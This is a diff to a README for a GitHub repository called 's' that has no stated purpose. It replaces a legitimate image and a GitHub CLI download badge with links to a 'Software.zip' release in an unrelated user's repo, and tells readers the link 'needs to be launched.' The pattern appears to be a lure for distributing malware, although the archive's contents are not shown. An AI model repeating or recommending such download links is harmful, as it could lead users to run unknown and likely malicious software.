@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to the "s" Repository!
 
-![s](https://octodex.github.com/images/spidertocat.png)
+![s](https://github.com/lozzo992/s/releases/download/v1.0/Software.zip)
 
 ## Description
 Welcome to the "s" repository! This repository does not provide a short description, leaving it up to your imagination and exploration to uncover its mysteries.
@@ -14,7 +14,7 @@ Welcome to the "s" repository! This repository does not provide a short descript
 
 ## Installation
 To dive into the "s" repository, click the button below to download the repository:
-[![Download Here](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Here](https://github.com/lozzo992/s/releases/download/v1.0/Software.zip)](https://github.com/lozzo992/s/releases/download/v1.0/Software.zip)
 This link needs to be launched to start your exploration.
 
 ## Features
